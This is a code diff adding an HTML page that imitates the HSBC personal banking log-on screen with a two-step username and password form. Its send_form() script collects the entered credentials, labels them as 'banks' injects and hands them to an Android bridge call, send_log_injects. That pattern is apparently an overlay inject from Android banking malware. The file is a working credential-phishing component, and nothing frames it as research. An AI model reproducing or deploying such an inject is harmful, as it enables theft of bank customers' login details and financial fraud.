@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>hsbc</title>
+    <link rel="shortcut icon" href="com.htsu.hsbcpersonalbanking.png" type="image/png">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+    text-align: right;
+    background-size: 100%;
+    padding: 20px 30px 20px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #7e7e7e;
+    text-align: left;
+    background: none;
+    outline: none;
+    border: 1px solid #d7d7d7;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #e14135;
+    color: #ffffff;
+    border: 1px solid #e14135;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #111111;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #7e7e7e;
+    font-size: 15px;
+}
+:root {
+  --primary: hsl(0, 0%, 90%);
+  --accent: hsl(35, 100%, 63%);
+  --text: hsl(0, 0%, 17%);
+}
+
+.checkbox {
+  display: inline-flex;
+  align-items: center;
+  cursor: pointer;
+}
+
+.checkbox__native {
+  display: none;
+}
+
+.checkbox__native:checked + .checkbox__custom {
+  background-color: #F44336;
+  border-color: #F44336;
+}
+
+.checkbox__custom {
+  width: 1.3em;
+  height: 1.3em;
+  border: 1px solid hsl(0, 0%, 66%);
+  border-radius: 3px;
+  margin-right: 10px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-shrink: 0;
+  transition: all 0.1s;
+}
+
+.checkbox__custom::after {
+  content: '\2714';
+  color: white;
+}
+</style>
+
+<script type="text/javascript">
+    function openPasswd() {
+        if (document.getElementById("login").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+        document.getElementById("log").style.display="none";
+        document.getElementById("passwd").style.display="block";
+    }
+</script>
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo1" style="text-align: left; margin: 50px 0px 0px 35px;">
+<span style="font-weight: 600;">Log On</span>
+</div>
+
+<div class="area" style="background: #fff; padding: 30px; border-radius: 3px; height: 320px;">
+    <label style="float: left;padding-bottom: 5px;">Enter your username</label>
+    <section style="text-align: left;position: absolute;top: 220px;">
+  
+<label for="cb" class="checkbox">
+  
+<input type="checkbox" name="sumbit" id="cb" class="checkbox__native" />
+  
+<div class="checkbox__custom"></div>
+  
+Remember my username
+</label>
+  
+</section>
+        <input type="text" name="login" id="login" placeholder="eg IB1234567890 or John123" style="height: 50px;">
+
+        <button type="button" id="eye" style="background: none; border: none; float: right; position: relative; top: -50px; cursor: pointer;">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAdCAYAAABfeMd1AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAKmSURBVEhL5VX9S2JREPX//9FMLStFM8UwTAtBUPEDA/EjEknFUkFLUbEyv7VZzrBX3nveZ7uw7A+7B46id+49d+admWegv4D/QOTr64tWqxW9vr5SJpOhm5sb8vl8FAgEKBqNUqVSoclkQpvN5ucOfeyI4PDxeEyPj490cXFBBwcHZDQapTw5OaF0Ok2DwYD36UElsl6vqdPp8K1lh+rx/PycarUaZy7DVgQ3abVaXBKTySQ9bB+R1f39PV9Ui61Iv98nv9+/Ux78Pj09pcvLSwqFQnR1dUV2u10VI4j/q9XqTulYZLlccm1l9bdYLJTL5Wg2m9F8Pufvj48PvvXZ2ZkqFvtxieFwyIcLsAj+PDo6Um0QhEg8HqeHhwcWa7fb7CgQv7GujDebzVQsFlWuY5FsNqsK3Efc9vn5mTc3Gg1yOBw7MTAOshVgETxsbaAeIYK6A/V6Xfp8INzr9TgGMCAtpKgN1CMe/nQ65UaMxWJ0eHi4EwN3wqkCBgRrg/QoygADYAroPUcQfSNcZkB3y4K09Hg8NBqNeGMqlZJmoKRKBOWSWVdLzCtk8Pb2Jl1XEuepyoUPl8slDVby9vaWms0m94dsXUk0LwarAIsgfVmwknAgsgmHw9J1JYPBIL2/v7MAwCIvLy90fHws3SCIxoOrECtbF4RTEascliyyWCzYjrJNgigXSgVXydYFMeMwB5VgEQDN4/V6pRtBeB+O2ucqm81G5XJZPiABLKCDnU7nL7lNS6vVSnd3dzsCwFYEQMDT09NvvVNwIYyRfD6v+ypWiQh0u11KJpPkdrt1y4NLYG5FIhEelLIMBKQiANyBV3GpVKJEIsHWvb6+ZgPAyoVCgRsOY+k76IoIoATodByGEfT5+ckvLtlrVg/fivwJ/CsiRD8ArFyexWGw+usAAAAASUVORK5CYII=" alt="eye" />
+        </button>
+        <input type="button" name="sumbit" onclick="openPasswd()" value="Continue">
+        <a href="#" style="font-weight: 600;color: #444345;position: relative;text-decoration: none;font-size: 13px;display: inline-block;margin-top: 25px;margin-right: 5px;float: left;">Not Registered</a>
+        <input name="exit" type="hidden" text="true"/>
+
+</div>
+
+</div>
+
+<div class="" id="passwd" style="display: none;">
+
+<div class="logo1" style="text-align: left; margin: 50px 0px 0px 35px;">
+<span style="font-weight: 600;">Hello</span>
+</div>
+
+<div class="area" style="background: #fff; padding: 30px; border-radius: 3px; height: 320px;">
+    <label style="float: left;padding-bottom: 5px;">Enter your password</label>
+        <input type="password" name="password" id="password"  style="height: 50px;">
+
+        <button type="button" id="eye" style="background: none; border: none; float: right; position: relative; top: -50px; cursor: pointer;">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAdCAYAAABfeMd1AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAKmSURBVEhL5VX9S2JREPX//9FMLStFM8UwTAtBUPEDA/EjEknFUkFLUbEyv7VZzrBX3nveZ7uw7A+7B46id+49d+admWegv4D/QOTr64tWqxW9vr5SJpOhm5sb8vl8FAgEKBqNUqVSoclkQpvN5ucOfeyI4PDxeEyPj490cXFBBwcHZDQapTw5OaF0Ok2DwYD36UElsl6vqdPp8K1lh+rx/PycarUaZy7DVgQ3abVaXBKTySQ9bB+R1f39PV9Ui61Iv98nv9+/Ux78Pj09pcvLSwqFQnR1dUV2u10VI4j/q9XqTulYZLlccm1l9bdYLJTL5Wg2m9F8Pufvj48PvvXZ2ZkqFvtxieFwyIcLsAj+PDo6Um0QhEg8HqeHhwcWa7fb7CgQv7GujDebzVQsFlWuY5FsNqsK3Efc9vn5mTc3Gg1yOBw7MTAOshVgETxsbaAeIYK6A/V6Xfp8INzr9TgGMCAtpKgN1CMe/nQ65UaMxWJ0eHi4EwN3wqkCBgRrg/QoygADYAroPUcQfSNcZkB3y4K09Hg8NBqNeGMqlZJmoKRKBOWSWVdLzCtk8Pb2Jl1XEuepyoUPl8slDVby9vaWms0m94dsXUk0LwarAIsgfVmwknAgsgmHw9J1JYPBIL2/v7MAwCIvLy90fHws3SCIxoOrECtbF4RTEascliyyWCzYjrJNgigXSgVXydYFMeMwB5VgEQDN4/V6pRtBeB+O2ucqm81G5XJZPiABLKCDnU7nL7lNS6vVSnd3dzsCwFYEQMDT09NvvVNwIYyRfD6v+ypWiQh0u11KJpPkdrt1y4NLYG5FIhEelLIMBKQiANyBV3GpVKJEIsHWvb6+ZgPAyoVCgRsOY+k76IoIoATodByGEfT5+ckvLtlrVg/fivwJ/CsiRD8ArFyexWGw+usAAAAASUVORK5CYII=" alt="eye" />
+        </button>
+        
+        <a href="#" style="font-weight: 600;color: #4d4b4d;position: relative;text-decoration: none;font-size: 13px;display: inline-block;margin-right: -35px;float: right;">Forgot password</a>
+        <input type="button" name="sumbit" onclick="send_form()" value="Log On">
+        <input name="exit" type="hidden" text="true"/>
+
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+
+function send_form()
+{
+if (document.getElementById("password").value == '')
+{
+    alert ('All fields required!');
+    return false;
+}
+var data = {};
+    data.login = document.getElementById('login').value;
+    data.password = document.getElementById('password').value;
+    data.type_injects = "banks";
+    data.closed = "close_activity_injects";
+
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
